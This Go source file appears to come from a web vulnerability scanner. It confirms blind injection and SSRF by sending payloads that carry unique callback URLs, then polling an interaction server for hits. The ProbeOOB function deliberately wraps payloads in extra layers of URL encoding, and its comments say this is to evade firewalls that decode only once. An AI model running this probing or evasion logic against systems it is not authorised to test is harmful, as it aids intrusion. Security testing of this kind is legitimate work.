package checks

import (
	"context"
	"net/url"
	"strings"
	"time"

	"github.com/guaidao2/crackweb/internal/payload"
)

// Placeholders a check puts in an out-of-band payload seed. The sender replaces
// them just before the request goes out, because the value has to be unique per
// attempt: correlation only works if each injection carries a callback name that
// has never been sent before.
const (
	// CallbackURL is replaced with a full URL, e.g. http://10.0.0.5:8081/ab12.
	CallbackURL = "{callback}"
	// CallbackHost is replaced with the bare authority, for payloads that cannot
	// carry a URL — a DNS lookup in a shell command, for instance.
	CallbackHost = "{callback_host}"
)

// OOBWait is how long an out-of-band check waits for a callback before moving
// on. The interaction is asynchronous — a blind SSRF fires seconds after the
// request that caused it — so the wait is generous while each poll is cheap.
const OOBWait = 6 * time.Second

// oobPollInterval is how often the interaction server is checked while waiting.
const oobPollInterval = 250 * time.Millisecond

// maxOOBEncodingLayers bounds how far an out-of-band payload is encoded in the
// search for a form the filter does not recognise.
const maxOOBEncodingLayers = 2

// ProbeOOB sends payloads that carry a callback address and reports the first one
// the target actually called back to.
//
// Two things make it different from ordinary injection, and both are structural.
//
// First, judgement cannot happen per request. The proof arrives later, on a
// different connection, so every variation is sent before any callback is
// collected.
//
// Second, the payload is not mutated the way an injection payload is. The
// callback name is a random token that has to survive the trip byte for byte, so
// transformations that rewrite characters — case flipping, comment insertion —
// would break correlation rather than evade anything. The evasion available here
// is whole-string encoding, which is exactly what a filter that normalises once
// fails to see through.
func (c *Context) ProbeOOB(
	ctx context.Context,
	t *Target,
	checkID string,
	seeds []string,
	wait time.Duration,
) (*Attempt, error) {
	if c.OOB == nil || t == nil || t.Request == nil || t.Param == nil || len(seeds) == 0 {
		return nil, nil
	}
	if wait <= 0 {
		wait = c.OOBWait
	}
	if wait <= 0 {
		wait = OOBWait
	}

	host := t.Request.Hostname()

	for layer := 0; layer <= maxOOBEncodingLayers; layer++ {
		var (
			sent             []pendingAttempt
			blockedSomething bool
		)

		for _, seed := range seeds {
			callbackURL, token := c.OOB.NewURL(checkID)
			// Substitute first, encode afterwards: encoding the placeholder
			// would leave nothing to substitute.
			value := substituteCallback(seed, callbackURL)

			// One round of encoding is not evasion, it is what makes the request
			// legal: a shell payload contains spaces and semicolons, and those
			// cannot appear raw in a request line. The extra rounds are the
			// evasion — a filter that decodes once still sees the inner encoding
			// rather than the payload.
			value = url.QueryEscape(value)
			for i := 0; i < layer; i++ {
				value = url.QueryEscape(value)
			}

			// Sent verbatim: the encoding above is the whole point, and letting
			// the transport encode again would double it.
			request, response, err := c.InjectEncoded(ctx, t, value, EncodeNone)
			if err != nil || request == nil || response == nil {
				continue
			}

			attempt := &Attempt{
				Request:  request,
				Response: response,
				Variant:  payload.Variant{Value: value, Generation: layer},
			}
			attempt.Blocked = c.WAF.IsBlocked(host, response)
			if attempt.Blocked {
				blockedSomething = true
				continue
			}
			sent = append(sent, pendingAttempt{Token: token, Attempt: attempt})
		}

		if found := c.awaitCallbacks(ctx, sent, wait); found != nil {
			c.WAF.Raise(host, checkID, layer)
			return found, nil
		}
		if !blockedSomething {
			// Nothing was refused, so the target is not filtering. Waiting
			// longer would only cost time.
			return nil, nil
		}
	}
	return nil, nil
}

// pendingAttempt pairs a callback token with the request that planted it.
type pendingAttempt struct {
	Token   string
	Attempt *Attempt
}

// awaitCallbacks polls the interaction server until a callback arrives or the
// wait expires, and returns the attempt the callback belongs to.
func (c *Context) awaitCallbacks(ctx context.Context, pending []pendingAttempt, wait time.Duration) *Attempt {
	if len(pending) == 0 {
		return nil
	}
	deadline := time.Now().Add(wait)
	for {
		for _, item := range pending {
			if interactions := c.OOB.Poll(item.Token); len(interactions) > 0 {
				item.Attempt.Interactions = interactions
				return item.Attempt
			}
		}
		if time.Now().After(deadline) {
			return nil
		}
		select {
		case <-time.After(oobPollInterval):
		case <-ctx.Done():
			return nil
		}
	}
}

// substituteCallback replaces the callback placeholders in a payload.
func substituteCallback(value, callbackURL string) string {
	if !strings.Contains(value, CallbackURL) && !strings.Contains(value, CallbackHost) {
		return value
	}
	host := callbackURL
	if i := strings.Index(host, "://"); i >= 0 {
		host = host[i+3:]
	}
	host = strings.TrimSuffix(host, "/")

	out := strings.ReplaceAll(value, CallbackURL, callbackURL)
	return strings.ReplaceAll(out, CallbackHost, host)
}
